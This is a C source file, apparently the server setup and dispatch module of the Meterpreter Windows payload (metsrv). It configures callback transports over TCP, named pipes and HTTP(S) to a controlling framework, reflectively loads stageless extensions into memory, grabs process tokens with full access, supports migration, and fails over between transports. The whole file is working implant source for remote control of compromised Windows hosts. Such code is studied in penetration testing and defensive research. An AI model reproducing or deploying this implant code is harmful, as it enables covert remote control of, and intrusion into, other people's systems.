/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include <ws2tcpip.h>
#include "common_exports.h"

#include "server_transport_winhttp.h"
#include "server_transport_tcp.h"
#include "server_transport_named_pipe.h"
#include "packet_encryption.h"

extern Command* extensionCommands;

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

/*!
 * @brief Get the session id that this meterpreter server is running in.
 * @return ID of the current server session.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
	HMODULE kernel	 = NULL;
	DWORD sessionId = 0;

	do
	{
		if (!processIdToSessionId)
		{
			kernel = LoadLibraryA("kernel32.dll");
			if (kernel)
			{
				processIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(kernel, "ProcessIdToSessionId");
			}
		}

		if (!processIdToSessionId)
		{
			break;
		}

		if (!processIdToSessionId(GetCurrentProcessId(), &sessionId))
		{
			sessionId = -1;
		}

	} while( 0 );

	if (kernel)
	{
		FreeLibrary(kernel);
	}

	return sessionId;
}

/*!
 * @brief Load any stageless extensions that might be present in the current payload.
 * @param remote Pointer to the remote instance.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 * @return Pointer to the end of the configuration.
 */
LPBYTE load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensions)
{
	while (stagelessExtensions->size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size, MAKEINTRESOURCEA(EXPORT_REFLECTIVELOADER));
		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
	}

	dprintf("[SERVER] All stageless extensions loaded");

	// once we have reached the end, we may have extension initializers
	LPBYTE initData = (LPBYTE)(&stagelessExtensions->size) + sizeof(stagelessExtensions->size);

	// Config blog is terminated by a -1
	while (*(UINT*)initData != 0xFFFFFFFF)
	{
		UINT extensionId = *(UINT*)initData;
		DWORD dataSize = *(DWORD*)(initData + sizeof(DWORD));
		UINT offset = sizeof(UINT) + sizeof(DWORD);
		LPBYTE data = initData + offset;
		dprintf("[STAGELESS] init data at %p, ID %u, size is %d", initData, extensionId, dataSize);
		stagelessinit_extension(extensionId, data, dataSize);
		initData = data + dataSize;
		dprintf("[STAGELESS] init done, now pointing to %p", initData);
		dprintf("[STAGELESS] %p contains %x", *(UINT*)initData);
	}

	dprintf("[SERVER] All stageless extensions initialised");
	return initData + sizeof(UINT);
}

static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)
{
	Transport* transport = NULL;
	dprintf("[TRNS] Transport claims to have URL: %S", transportCommon->url);
	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
	dprintf("[TRNS] Transport claims to have retry wait: %d", transportCommon->retry_wait);

	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
	{
		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);
	}
	else if (wcsncmp(transportCommon->url, L"pipe", 4) == 0)
	{
		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
	}
	else
	{
		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);
	}

	if (transport == NULL)
	{
		// something went wrong
		return NULL;
	}

	// always insert at the tail. The first transport will be the one that kicked everything off
	if (remote->transport == NULL)
	{
		// point to itself, as this is the first transport.
		transport->next_transport = transport->prev_transport = transport;
		remote->transport = transport;
	}
	else
	{
		transport->prev_transport = remote->transport->prev_transport;
		transport->next_transport = remote->transport;

		remote->transport->prev_transport->next_transport = transport;
		remote->transport->prev_transport = transport;
	}

	return transport;
}

static void append_transport(Transport** list, Transport* newTransport)
{
	if (*list == NULL)
	{
		// point to itself!
		newTransport->next_transport = newTransport->prev_transport = newTransport;
		*list = newTransport;
	}
	else
	{
		// always insert at the tail
		newTransport->prev_transport = (*list)->prev_transport;
		newTransport->next_transport = (*list);

		(*list)->prev_transport->next_transport = newTransport;
		(*list)->prev_transport = newTransport;
	}
}

static void remove_transport(Remote* remote, Transport* oldTransport)
{
	// if we point to ourself, then we're the last one
	if (remote->transport->next_transport == remote->transport)
	{
		remote->transport = NULL;
	}
	else
	{
		// if we're removing the current one we need to move the pointer to the
		// next one in the list.
		if (remote->transport == oldTransport)
		{
			remote->transport = remote->transport->next_transport;
		}

		oldTransport->prev_transport->next_transport = oldTransport->next_transport;
		oldTransport->next_transport->prev_transport = oldTransport->prev_transport;
	}

	oldTransport->transport_destroy(oldTransport);
}

static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)
{
	DWORD totalSize = 0;
	MetsrvTransportCommon* current = transports;

	// The first part of the transport is always the URL, if it's NULL, we are done.
	while (current->url[0] != 0)
	{
		DWORD size;
		if (create_transport(remote, current, &size) != NULL)
		{
			dprintf("[TRANS] transport created of size %u", size);
			totalSize += size;

			// go to the next transport based on the size of the existing one.
			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
		}
		else
		{
			// This is not good
			return FALSE;
		}
	}

	// account for the last terminating NULL wchar
	*parsedSize = totalSize + sizeof(wchar_t);

	return TRUE;
}

static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LPDWORD size)
{
	// This function is really only used for migration purposes.
	DWORD s = sizeof(MetsrvSession);
	MetsrvSession* sess = (MetsrvSession*)malloc(s);
	ZeroMemory(sess, s);

	dprintf("[CONFIG] preparing the configuration");

	// start by preparing the session, using the given UUID if specified, otherwise using
	// the existing session UUID
	memcpy(sess->uuid, uuid == NULL ? remote->orig_config->session.uuid : uuid, UUID_SIZE);
	// session GUID should persist across migration
	memcpy(sess->session_guid, remote->orig_config->session.session_guid, sizeof(GUID));
#ifdef DEBUGTRACE
	memcpy(sess->log_path, remote->orig_config->session.log_path, LOG_PATH_SIZE);

#endif
	if (remote->sess_expiry_end)
	{
		sess->expiry = remote->sess_expiry_end - current_unix_timestamp();
	}
	else
	{
		sess->expiry = 0;
	}
	sess->exit_func = EXITFUNC_THREAD; // migration we default to this.

	Transport* current = remote->transport;
	Transport* t = remote->transport;
	do
	{
		// extend memory appropriately
		DWORD neededSize = t->get_config_size(t);

		dprintf("[CONFIG] Allocating %u bytes for transport, total of %u bytes", neededSize, s + neededSize);

		sess = (MetsrvSession*)realloc(sess, s + neededSize);

		// load up the transport specifics
		LPBYTE target = (LPBYTE)sess + s;

		ZeroMemory(target, neededSize);
		s += neededSize;

		if (t == current && t->get_handle != NULL)
		{
			sess->comms_handle.handle = t->get_handle(t);
			dprintf("[CONFIG] Comms handle set to %p", (UINT_PTR)sess->comms_handle.handle);
		}

		switch (t->type)
		{
			case METERPRETER_TRANSPORT_TCP:
			{
				transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
				break;
			}
			case METERPRETER_TRANSPORT_PIPE:
			{
				transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe*)target);
				break;
			}
			case METERPRETER_TRANSPORT_HTTP:
			case METERPRETER_TRANSPORT_HTTPS:
			{
				transport_write_http_config(t, (MetsrvTransportHttp*)target);
				break;
			}
		}

		t = t->next_transport;
	} while (t != current);

	// Terminate the transport with a NULL wchar.
	// Then terminate the extensions with a zero DWORD.
	// Then terminate the config with a -1 DWORD
	DWORD terminatorSize = sizeof(wchar_t) + sizeof(DWORD) + sizeof(DWORD);
	sess = (MetsrvSession*)realloc(sess, s + terminatorSize);
	memset((LPBYTE)sess + s, 0xFF, terminatorSize);
	ZeroMemory((LPBYTE)sess + s, terminatorSize - sizeof(DWORD));
	s += terminatorSize;

	// hand off the data
	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
	*size = s;
	*config = (MetsrvConfig*)sess;
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(MetsrvConfig* config)
{
	THREAD* serverThread = NULL;
	Remote* remote = NULL;
	char stationName[256] = { 0 };
	char desktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
	dprintf("[SESSION] Comms handle: %u", config->session.comms_handle);
	dprintf("[SESSION] Expiry: %u", config->session.expiry);

	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
		config->session.uuid[0], config->session.uuid[1], config->session.uuid[2], config->session.uuid[3],
		config->session.uuid[4], config->session.uuid[5], config->session.uuid[6], config->session.uuid[7],
		config->session.uuid[8], config->session.uuid[9], config->session.uuid[10], config->session.uuid[11],
		config->session.uuid[12], config->session.uuid[13], config->session.uuid[14], config->session.uuid[15]);

	dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
		config->session.session_guid[0], config->session.session_guid[1], config->session.session_guid[2], config->session.session_guid[3],
		config->session.session_guid[4], config->session.session_guid[5], config->session.session_guid[6], config->session.session_guid[7],
		config->session.session_guid[8], config->session.session_guid[9], config->session.session_guid[10], config->session.session_guid[11],
		config->session.session_guid[12], config->session.session_guid[13], config->session.session_guid[14], config->session.session_guid[15]);

	disable_thread_error_reporting();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(remote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			remote->sess_expiry_time = config->session.expiry;
			remote->sess_start_time = current_unix_timestamp();
			if (remote->sess_expiry_time)
			{
				remote->sess_expiry_end = remote->sess_start_time + remote->sess_expiry_time;
			}
			else
			{
				remote->sess_expiry_end = 0;
			}

			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);

			DWORD transportSize = 0;
			if (!create_transports(remote, config->transports, &transportSize))
			{
				// not good, bail out!
				SetLastError(ERROR_BAD_ARGUMENTS);
				break;
			}

			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->session.comms_handle.handle);
			if (remote->transport->set_handle)
			{
				remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
			}

			// Set up the transport creation function pointer
			remote->trans_create = create_transport;
			// Set up the transport removal function pointer
			remote->trans_remove = remove_transport;
			// and the config creation pointer
			remote->config_create = config_create;

			// Store our thread handle
			remote->server_thread = serverThread->handle;

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();
			
			// this has to be done after dispatch routine are registered
			LPBYTE configEnd = load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));

			dprintf("[SERVER] Copying configuration ..");
			// the original config can actually be mapped as RX in cases such as when stageless payloads
			// are baked directly into .NET assemblies. We need to make sure that this area of memory includes
			// The writable flag as well otherwise we get access violations when we're interacting with the
			// configuration block down the track. So instead of marking the original configuration as RWX (to cover
			// all cases) we will instead just muck with a copy of it on the heap.
			DWORD_PTR configSize = (DWORD_PTR)configEnd - (DWORD_PTR)config;
			remote->orig_config = (MetsrvConfig*)malloc(configSize);
			memcpy_s(remote->orig_config, configSize, config, configSize);
			dprintf("[SERVER] Config copied..");

			// Store our process token
			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
			}

			if (scheduler_initialize(remote) != ERROR_SUCCESS)
			{
				SetLastError(ERROR_BAD_ENVIRONMENT);
				break;
			}

			// Copy it to the thread token
			remote->thread_token = remote->server_token;

			// Save the initial session/station/desktop names...
			remote->orig_sess_id = server_sessionid();
			remote->curr_sess_id = remote->orig_sess_id;
			GetUserObjectInformationA(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
			remote->orig_station_name = _strdup(stationName);
			remote->curr_station_name = _strdup(stationName);
			GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
			remote->orig_desktop_name = _strdup(desktopName);
			remote->curr_desktop_name = _strdup(desktopName);

			remote->sess_start_time = current_unix_timestamp();

			dprintf("[SERVER] Time to kick off connectivity to MSF ...");
			// loop through the transports, reconnecting each time.
			while (remote->transport)
			{
				if (remote->transport->transport_init)
				{
					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport);
					// Each transport has its own set of retry settings and each should honour
					// them individually.
					if (remote->transport->transport_init(remote->transport) != ERROR_SUCCESS)
					{
						dprintf("[SERVER] transport initialisation failed, moving to the next transport");
						remote->transport = remote->transport->next_transport;

						// when we have a list of transports, we'll iterate to the next one.
						continue;
					}
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);

				dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
				if (remote->transport->transport_deinit)
				{
					dprintf("[DISPATCH] deinitialising transport");
					remote->transport->transport_deinit(remote->transport);
				}

				dprintf("[TRANS] resetting transport");
				if (remote->transport->transport_reset)
				{
					remote->transport->transport_reset(remote->transport, dispatchResult == ERROR_SUCCESS && remote->next_transport == NULL);
				}

				// If the transport mechanism failed, then we should loop until we're able to connect back again.
				if (dispatchResult == ERROR_SUCCESS)
				{
					dprintf("[DISPATCH] Server requested shutdown of dispatch");
					// But if it was successful, and this is a valid exit, then we should clean up and leave.
					if (remote->next_transport == NULL)
					{
						dprintf("[DISPATCH] No next transport specified, leaving");
						// we weren't asked to switch transports, so we exit.
						break;
					}

					// we need to change transports to the one we've been given. We will assume, for now,
					// that the transport has been created using the appropriate functions and that it is
					// part of the transport list.
					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
					remote->transport = remote->next_transport;
					remote->next_transport = NULL;
				}
				else
				{
					// move to the next one in the list
					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->transport->next_transport);
					remote->transport = remote->transport->next_transport;
				}

				// transport switching and failover both need to support the waiting functionality.
				if (remote->next_transport_wait > 0)
				{
					dprintf("[TRANS] Sleeping for %u seconds ...", remote->next_transport_wait);

					sleep(remote->next_transport_wait);

					// the wait is a once-off thing, needs to be reset each time
					remote->next_transport_wait = 0;
				}

				// if we had an encryption context we should clear it up.
				free_encryption_context(remote);
			}

			// clean up the transports
			while (remote->transport)
			{
				remove_transport(remote, remote->transport);
			}

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(remote);
		} while (0);

		dprintf("[DISPATCH] calling scheduler_destroy...");
		scheduler_destroy();

		dprintf("[DISPATCH] calling command_join_threads...");
		command_join_threads();

		remote_deallocate(remote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
